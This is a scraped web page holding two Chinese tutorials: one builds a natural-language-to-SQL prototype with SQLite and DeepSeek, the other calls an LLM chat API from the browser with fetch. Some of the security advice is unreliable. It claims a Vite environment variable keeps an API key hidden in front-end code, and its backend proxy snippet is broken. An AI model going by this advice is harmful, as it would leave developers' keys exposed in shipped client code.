                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、为什么要做“自然语言转 SQL”？</h2>
<p>在数据分析、低代码平台、BI 工具等场景中，非技术人员常因不会写 SQL 而无法自助查询数据。而借助 LLM（如 DeepSeek、GPT），我们可以：</p>
<ul>
<li><strong>降低使用门槛</strong>：用户只需用自然语言提问（如“开发部员工工资多少？”）</li>
<li><strong>提升开发效率</strong>：自动生成准确 SQL，减少人工编写与调试成本</li>
<li><strong>快速验证想法</strong>：原型阶段无需构建复杂 UI，一句话即可查数据</li>
</ul>
<blockquote>
<p>✅ 本文以 <strong>SQLite + DeepSeek API</strong> 为例，展示一个最小可行方案（MVP）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、技术栈与准备</h2>

























<table><thead><tr><th>组件</th><th>说明</th></tr></thead><tbody><tr><td><strong>数据库</strong></td><td>SQLite（Python 内置，无需安装服务）</td></tr><tr><td><strong>LLM 服务</strong></td><td>DeepSeek（兼容 OpenAI API，国内可访问）</td></tr><tr><td><strong>编程语言</strong></td><td>Python 3.7+</td></tr><tr><td><strong>依赖库</strong></td><td><code>sqlite3</code>（内置）、<code>openai</code>（用于调用 DeepSeek）</td></tr></tbody></table>
<p>安装依赖：</p>
<pre><code class="hljs">bash
编辑
pip install openai
</code></pre>
<hr/>
<h2 data-id="heading-2">三、完整实现步骤</h2>
<h3 data-id="heading-3">步骤 1：创建 SQLite 表并插入示例数据</h3>
<pre><code class="hljs language-python" lang="python">python
编辑
<span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># 连接数据库（若不存在则自动创建）</span>
conn = sqlite3.connect(<span class="hljs-string">"text5.db"</span>)
cursor = conn.cursor()

<span class="hljs-comment"># 创建 employees 表</span>
cursor.execute(<span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS employees (
    id INTEGER PRIMARY KEY,      -- 注意：原文 PRINARY 是拼写错误，应为 PRIMARY
    name TEXT,
    department TEXT,
    salary INTEGER
)
"""</span>)

<span class="hljs-comment"># 插入测试数据</span>
sample_data = [
    (<span class="hljs-number">6</span>, <span class="hljs-string">"陈老板"</span>, <span class="hljs-string">"开发部"</span>, <span class="hljs-number">100000</span>),
    (<span class="hljs-number">7</span>, <span class="hljs-string">"张三"</span>, <span class="hljs-string">"销售部"</span>, <span class="hljs-number">20000</span>),
    (<span class="hljs-number">8</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"开发部"</span>, <span class="hljs-number">50000</span>),
    (<span class="hljs-number">9</span>, <span class="hljs-string">"王五"</span>, <span class="hljs-string">"销售部"</span>, <span class="hljs-number">22000</span>),
]
cursor.executemany(<span class="hljs-string">'INSERT INTO employees VALUES (?, ?, ?, ?)'</span>, sample_data)
conn.commit()
</code></pre>
<blockquote>
<p>⚠️ <strong>注意</strong>：原文中 <code>PRINARY KEY</code> 是拼写错误，正确应为 <code>PRIMARY KEY</code>，否则会创建成普通列！</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">步骤 2：提取表结构（Schema）</h3>
<p>为了让 LLM 理解表结构，需提供清晰的 Schema 描述：</p>
<pre><code class="hljs language-python" lang="python">python
编辑
<span class="hljs-comment"># 获取表字段信息</span>
schema = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
<span class="hljs-comment"># 构造 CREATE TABLE 风格的字符串</span>
schema_str = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"    <span class="hljs-subst">{col[<span class="hljs-number">1</span>]}</span> <span class="hljs-subst">{col[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> schema]) + <span class="hljs-string">"\n)"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"数据库 Schema:"</span>)
<span class="hljs-built_in">print</span>(schema_str)
</code></pre>
<p>输出示例：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">sql</span>
编辑
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> EMPLOYEES (
    id <span class="hljs-type">INTEGER</span>
    name TEXT
    department TEXT
    salary <span class="hljs-type">INTEGER</span>
)
</code></pre>
<blockquote>
<p>💡 虽然缺少约束（如 PRIMARY KEY），但对简单查询已足够。更严谨的做法可解析 DDL 或补充注释。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">步骤 3：调用 LLM 生成 SQL</h3>
<p>使用 DeepSeek 的 Reasoner 模型（擅长推理任务）：</p>
<pre><code class="hljs language-ini" lang="ini">python
编辑
from openai import OpenAI

<span class="hljs-attr">client</span> = OpenAI(
    <span class="hljs-attr">api_key</span>=<span class="hljs-string">'sk-xxxx'</span>,  <span class="hljs-comment"># 替换为你的 DeepSeek API Key</span>
    <span class="hljs-attr">base_url</span>=<span class="hljs-string">'https://api.deepseek.com/v1'</span>
)

def ask_deepseek(query: str, schema: str) -&gt; str:
    <span class="hljs-attr">prompt</span> = f<span class="hljs-string">"""
这是一个数据库的Schema:
{schema}
根据这个Schema,你能输出一个SQL查询来回答以下问题吗？
只输出SQL查询,不要输出任何其他内容。也不要带任何格式。
问题：{query}
"""</span>
    <span class="hljs-attr">response</span> = client.chat.completions.create(
        <span class="hljs-attr">model</span>=<span class="hljs-string">"deepseek-reasoner"</span>,
        <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">2048</span>,
        <span class="hljs-attr">messages</span>=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}]
    )
    return response.choices<span class="hljs-section">[0]</span>.message.content.strip()

<span class="hljs-comment"># 测试提问</span>
<span class="hljs-attr">question</span> = <span class="hljs-string">"开发部部门员工的姓名和工资是多少？"</span>
<span class="hljs-attr">sql</span> = ask_deepseek(question, schema_str)
print("生成的 SQL 查询：")
print(sql)
</code></pre>
<p>预期输出：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">sql</span>
编辑
<span class="hljs-keyword">SELECT</span> name, salary <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">'开发部'</span>;
</code></pre>
<hr/>
<h3 data-id="heading-6">步骤 4：执行 SQL 并返回结果（可选）</h3>
<pre><code class="hljs language-scss" lang="scss">python
编辑
result = <span class="hljs-attribute">cursor</span><span class="hljs-selector-class">.execute</span>(sql)<span class="hljs-selector-class">.fetchall</span>()
<span class="hljs-built_in">print</span>("查询结果：", result)
# 输出：<span class="hljs-selector-attr">[(<span class="hljs-string">'陈老板'</span>, 100000), (<span class="hljs-string">'李四'</span>, 50000)]</span>
</code></pre>
<hr/>
<h2 data-id="heading-7">四、关键技巧与注意事项</h2>
<h3 data-id="heading-8">1. Prompt 设计要点</h3>
<ul>
<li><strong>明确指令</strong>：“只输出 SQL，不要解释”</li>
<li><strong>提供精确 Schema</strong>：字段名、类型必须一致</li>
<li><strong>示例引导（Few-shot）</strong> ：复杂场景可加 1~2 个例子提升准确率</li>
</ul>
<h3 data-id="heading-9">2. 常见问题与解决方案</h3>






























<table><thead><tr><th>问题</th><th>原因</th><th>解决方案</th></tr></thead><tbody><tr><td>生成无效 SQL</td><td>Schema 不清晰或字段名不匹配</td><td>使用 <code>PRAGMA table_info</code> 精确获取字段</td></tr><tr><td>返回多余文本</td><td>LLM 未严格遵循指令</td><td>在 Prompt 中强调“仅输出 SQL”</td></tr><tr><td>表名大小写错误</td><td>SQLite 默认小写</td><td>Schema 中统一用小写表名</td></tr><tr><td>拼写错误（如 PRINARY）</td><td>手动建表失误</td><td>建表时仔细检查语法</td></tr></tbody></table>
<h3 data-id="heading-10">3. 安全警告 ⚠️</h3>
<ul>
<li><strong>切勿直接执行 LLM 生成的 SQL！</strong><br/>
应进行<strong>白名单校验</strong>（如只允许 SELECT）、<strong>参数化查询</strong>，防止注入攻击。</li>
<li>生产环境建议增加 SQL 解析器（如 <code>sqlglot</code>）做语法校验。</li>
</ul>
<hr/>
<h2 data-id="heading-11">五、方案对比：不同实现方式优劣</h2>





























<table><thead><tr><th>方案</th><th>优点</th><th>缺点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>LLM 直接生成 SQL</strong></td><td>快速、灵活、支持自然语言</td><td>可能出错、需校验</td><td>原型验证、内部工具</td></tr><tr><td><strong>模板匹配 + 规则引擎</strong></td><td>稳定、可控</td><td>扩展性差、需维护规则</td><td>固定查询模式</td></tr><tr><td><strong>专用 NL2SQL 模型（如 SQLCoder）</strong></td><td>准确率高</td><td>需部署模型、资源消耗大</td><td>企业级产品</td></tr></tbody></table>
<blockquote>
<p>✅ 对于个人项目或 MVP，<strong>LLM + Prompt 工程</strong> 是性价比最高的选择。</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">六、总结要点</h2>
<ul>
<li>✅ SQLite 轻量易用，适合本地数据存储与测试</li>
<li>✅ 通过 <code>PRAGMA table_info</code> 可程序化获取表结构</li>
<li>✅ LLM（如 DeepSeek）能有效将自然语言转为 SQL</li>
<li>✅ <strong>Prompt 要清晰、约束要明确</strong></li>
<li>❌ <strong>永远不要信任 LLM 输出，必须校验 SQL 安全性</strong></li>
</ul>
<hr/>
<h2 data-id="heading-13">七、拓展思考</h2>
<ol>
<li><strong>如何支持多表 JOIN 查询？</strong><br/>
→ 在 Schema 中提供多个表的 DDL，并在问题中明确关联字段。</li>
<li><strong>能否缓存常见问题的 SQL？</strong><br/>
→ 可建立“问题- SQL”映射缓存，提升响应速度与稳定性。</li>
<li><strong>如何评估生成 SQL 的准确率？</strong><br/>
→ 构建测试集，用执行结果 vs 人工标注结果做比对。</li>
<li><strong>前端集成？</strong><br/>
→ 用 Flask/FastAPI 封装为 REST API，前端输入问题 → 返回表格数据。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零开始：前端如何通过 `fetch` 调用 大模型（详解）]]></title>    <link>https://juejin.cn/post/7575104251866873866</link>    <guid>https://juejin.cn/post/7575104251866873866</guid>    <pubDate>2025-11-23T06:34:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251866873866" data-draft-id="7575102474639327283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 从零开始：前端如何通过 `fetch` 调用 大模型（详解）"/> <meta itemprop="keywords" content="前端,JavaScript,LLM"/> <meta itemprop="datePublished" content="2025-11-23T06:34:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烟袅"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             从零开始：前端如何通过 `fetch` 调用 大模型（详解）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烟袅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:34:12.000Z" title="Sun Nov 23 2025 06:34:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 AI 应用开发中，我们经常需要在浏览器端直接调用大语言模型（LLM）的 API。虽然有 OpenAI SDK 等封装工具，但使用原生 <code>fetch</code> 发送 HTTP 请求是一种更灵活、可控且易于理解的方式。</p>
<p>本文将结合你提供的代码和笔记，深入解析 <strong>如何在前端通过 <code>fetch</code> 调用 DeepSeek 的聊天接口</strong>，并逐行解释每一个关键步骤。</p>
<hr/>
<h2 data-id="heading-0">🧩 一、完整的调用代码</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// llm api 地址</span>
<span class="hljs-keyword">const</span> endpoint = <span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>;

<span class="hljs-comment">// 请求头</span>
<span class="hljs-keyword">const</span> headers = {
  <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-keyword">import</span>.meta.env.VITE_DEEPSEEK_API_KEY}</span>`</span>
};

<span class="hljs-comment">// 请求体</span>
<span class="hljs-keyword">const</span> payload = {
  <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-chat'</span>,
  <span class="hljs-attr">messages</span>: [
    { <span class="hljs-attr">role</span>: <span class="hljs-string">'system'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'You are a helpful assistant.'</span> },
    { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'你好 Deepseek'</span> }
  ]
};

<span class="hljs-comment">// 发起请求</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  headers,
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
});

<span class="hljs-comment">// 解析响应</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">// 显示结果</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'reply'</span>).<span class="hljs-property">textContent</span> = data.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
</code></pre>
<p>这段代码实现了从用户输入到模型回复的完整流程。下面我们逐部分拆解。</p>
<hr/>
<h2 data-id="heading-1">🔍 二、HTTP 请求结构解析（结合你的笔记）</h2>
<h3 data-id="heading-2">1. 请求行（Request Line）</h3>
<pre><code class="hljs language-bash" lang="bash">POST /chat/completions HTTP/1.1
Host: api.deepseek.com
</code></pre>
<ul>
<li><code>POST</code>：必须使用 POST 方法，因为 API 接口要求；</li>
<li><code>/chat/completions</code>：DeepSeek 的聊天接口路径；</li>
<li><code>HTTP/1.1</code>：标准版本，浏览器自动处理。</li>
</ul>
<hr/>
<h3 data-id="heading-3">2. 请求头（Headers）</h3>
<pre><code class="hljs language-css" lang="css">{
  '<span class="hljs-attribute">Content</span>-Type': <span class="hljs-string">'application/json'</span>,
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer sk-xxxxxx'</span>
}
</code></pre>
<ul>
<li><code>'Content-Type': 'application/json'</code><br/>
告诉服务器请求体是 JSON 格式，这是必需的。</li>
<li><code>'Authorization': 'Bearer &lt;key&gt;'</code><br/>
认证方式，<code>Bearer</code> 是固定前缀，后面跟你的 API Key。</li>
</ul>
<blockquote>
<p>⚠️ 注意：API Key 不能硬编码在前端代码中，应通过 Vite 的环境变量管理：</p>
<pre><code class="hljs language-ini" lang="ini">// .env 文件
<span class="hljs-attr">VITE_DEEPSEEK_API_KEY</span>=sk-xxxxxxxx
</code></pre>
<p>在代码中使用 <code>import.meta.env.VITE_DEEPSEEK_API_KEY</code> 获取。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">3. 请求体（Body）</h3>
<pre><code class="hljs language-css" lang="css">{
  model: <span class="hljs-string">'deepseek-chat'</span>,
  messages: [
    { role: <span class="hljs-string">'system'</span>, content: <span class="hljs-string">'You are a helpful assistant.'</span> },
    { role: <span class="hljs-string">'user'</span>, content: <span class="hljs-string">'你好 Deepseek'</span> }
  ]
}
</code></pre>
<ul>
<li>
<p><code>model</code>：指定使用的模型名称；</p>
</li>
<li>
<p><code>messages</code>：对话历史，支持多轮交互；</p>
<ul>
<li><code>role: "system"</code>：设定助手行为；</li>
<li><code>role: "user"</code>：用户的提问内容。</li>
</ul>
</li>
</ul>
<blockquote>
<p>✅ 注意：<strong>请求体必须是字符串化后的 JSON</strong>，所以要用 <code>JSON.stringify()</code>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">4. 使用 <code>fetch</code> 发送请求</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  headers,
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
});
</code></pre>
<ul>
<li><code>method: 'POST'</code>：发送 POST 请求；</li>
<li><code>headers</code>：设置请求头；</li>
<li><code>body: JSON.stringify(payload)</code>：将 JS 对象转为字符串，<strong>不能直接传对象</strong>。</li>
</ul>
<blockquote>
<p>💡 <code>await</code> 比 <code>.then()</code> 更直观，适合异步操作。</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">5. 处理响应</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">data</span> = await response.json()<span class="hljs-comment">;</span>
console.log(data)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li><code>response.json()</code> 将响应体解析为 JavaScript 对象；</li>
<li><code>data.choices[0].message.content</code> 是模型返回的文本。</li>
</ul>
<hr/>
<h3 data-id="heading-7">6. 显示结果</h3>
<pre><code class="hljs language-ini" lang="ini">document.getElementById('reply').<span class="hljs-attr">textContent</span> = data.choices[<span class="hljs-number">0</span>].message.content<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>将模型回复显示在页面上（假设有一个 id 为 <code>reply</code> 的元素）。</li>
</ul>
<hr/>
<h2 data-id="heading-8">🔄 三、异步处理：<code>.then</code> vs <code>await</code></h2>
<p>你提到：</p>
<blockquote>
<p><code>- await 异步变同步比 then 更方便</code></p>
</blockquote>
<p>✅ 完全正确！</p>

















<table><thead><tr><th>方式</th><th>特点</th></tr></thead><tbody><tr><td><code>.then()</code></td><td>链式调用，适合复杂逻辑</td></tr><tr><td><code>await</code></td><td>代码像同步一样，更易读</td></tr></tbody></table>
<p>推荐使用 <code>await</code>，尤其是在处理多个异步操作时。</p>
<hr/>
<h2 data-id="heading-9">🔐 四、安全建议：API Key 的存放位置</h2>
<h3 data-id="heading-10">❌ 不推荐（前端暴露）</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">apiKey</span> = <span class="hljs-string">'sk-xxxxxxxx'</span><span class="hljs-comment">; // 直接写在代码里 → 容易泄露</span>
</code></pre>
<h3 data-id="heading-11">✅ 推荐（后端代理）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端路由</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/chat'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>, {
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${process.env.DEEPSEEK_API_KEY}</span>`</span> <span class="hljs-comment">// 后端环境变量，安全！</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(req.<span class="hljs-property">body</span>)
  });
  res.<span class="hljs-title function_">json</span>(result);
});
</code></pre>
<p>然后前端只调用自己的 <code>/api/chat</code>，<strong>永远看不到真实 API Key</strong>。</p>
<hr/>
